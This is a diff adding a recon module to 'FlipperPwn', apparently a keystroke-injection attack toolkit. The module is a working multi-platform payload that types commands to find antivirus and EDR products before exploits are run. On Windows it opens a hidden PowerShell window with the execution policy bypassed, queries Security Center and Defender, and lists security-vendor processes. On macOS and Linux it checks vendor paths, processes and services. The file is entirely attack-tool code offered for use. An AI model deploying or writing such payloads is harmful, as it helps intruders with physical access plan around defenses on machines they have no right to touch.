@@ -1,0 +1,44 @@
+# FlipperPwn Module: Security Software Detection
+# Identifies installed AV/EDR products before running exploits.
+# Run this before any exploit module to gauge detection risk.
+
+NAME av_detect
+DESCRIPTION Detect installed antivirus and endpoint security software
+CATEGORY recon
+PLATFORMS WIN,MAC,LINUX
+
+# No options required
+
+PLATFORM WIN
+  # Open hidden PowerShell via Run dialog
+  DELAY 500
+  GUI r
+  DELAY 300
+  STRING powershell -w h -nop -ep bypass
+  ENTER
+  DELAY 1000
+  # Query SecurityCenter2 WMI namespace (populated by Windows Security Center)
+  # productState is a hex bitmask: 0x1000 = enabled, 0x0010 = definitions up to date
+  STRING $o="$env:TEMP\av_detect.txt"; "=== SECURITY CENTER AV PRODUCTS ===" | Out-File $o; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState | Format-List | Out-File $o -Append; "=== SECURITY CENTER FIREWALL ===" | Out-File $o -Append; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName FirewallProduct | Select-Object displayName,productState | Format-List | Out-File $o -Append; "=== DEFENDER STATUS ===" | Out-File $o -Append; Get-MpComputerStatus 2>$null | Select-Object AMRunningMode,RealTimeProtectionEnabled,AntivirusEnabled | Format-List | Out-File $o -Append; "=== SECURITY PROCESSES ===" | Out-File $o -Append; Get-Process | Where-Object {$_.Name -match 'MsMpEng|CylanceSvc|cb|falcon|SentinelAgent|MBAMService|avgnt|avguard|bdagent|ekrn|eset|f-secure|sophos|symantec|norton|mcshield'} | Select-Object Name,Id | Out-File $o -Append; Start-Process notepad $o
+  ENTER
+
+PLATFORM MAC
+  # Open Terminal via Spotlight
+  DELAY 500
+  GUI SPACE
+  DELAY 400
+  STRING Terminal
+  ENTER
+  DELAY 1200
+  # Check common AV install paths and running processes
+  STRING o=/tmp/av_detect.txt; echo "=== KNOWN AV PATHS ===" > $o; for p in "/Library/Sophos Anti-Virus" "/Library/Application Support/Sophos" "/usr/local/McAfee" "/Library/Little Snitch" "/Library/Objective-See" "/Applications/Malwarebytes.app" "/Library/CrowdStrike" "/Library/SentinelOne" "/Applications/ESET Endpoint Security.app" "/Library/Symantec"; do [ -e "$p" ] && echo "FOUND: $p" >> $o; done; echo "=== SECURITY PROCESSES ===" >> $o; ps aux | grep -iE 'sophos|mcafee|falcon|sentinel|crowdstrike|eset|symantec|norton|malwarebytes|carbon|cylance|bitdefender' | grep -v grep >> $o; open -e $o
+  ENTER
+
+PLATFORM LINUX
+  # Open terminal emulator
+  DELAY 500
+  CTRL ALT t
+  DELAY 1000
+  # Check for common AV daemons by process name and known service names
+  STRING o=/tmp/av_detect.txt; echo "=== SECURITY PROCESSES ===" > $o; ps aux | grep -iE 'clamd|falcon-sensor|ossec|wazuh|trend|mcafee|sophos|eset|avast|avg|bitdefender|sentinel|crowdstrike|cylance|carbon' | grep -v grep >> $o; echo "=== SYSTEMD SECURITY SERVICES ===" >> $o; systemctl list-units --type=service 2>/dev/null | grep -iE 'falcon|ossec|wazuh|clamd|trend|sophos|eset|sentinel' >> $o; echo "=== AV BINARIES IN PATH ===" >> $o; which clamscan freshclam 2>/dev/null >> $o; xdg-open $o 2>/dev/null || cat $o
+  ENTER
